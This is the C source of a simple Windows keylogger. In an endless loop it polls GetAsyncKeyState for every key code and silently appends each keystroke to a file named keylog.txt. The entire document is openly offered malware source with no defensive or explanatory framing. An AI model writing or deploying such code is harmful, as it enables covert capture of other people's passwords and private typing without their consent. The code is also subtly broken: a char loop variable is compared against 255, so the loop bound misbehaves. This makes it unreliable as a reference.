#include <stdio.h>
#include <windows.h>

int main() {
    FILE *file;
    char key;
    while (1) {
        // Check all key codes (ASCII 8 to 255)
        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) { // Key just pressed
                file = fopen("keylog.txt", "a+");
                if (file != NULL) {
                    if (key == VK_SPACE)
                        fprintf(file, " ");
                    else if (key == VK_RETURN)
                        fprintf(file, "\n");
                    else if (key == VK_TAB)
                        fprintf(file, "\t");
                    else if ((key >= 32 && key <= 126)) // Printable characters
                        fprintf(file, "%c", key);
                    else
                        fprintf(file, "[%d]", key); // For other keys
                    fclose(file);
                }
            }
        }
        Sleep(10); // Reduce CPU usage
    }
    return 0;
}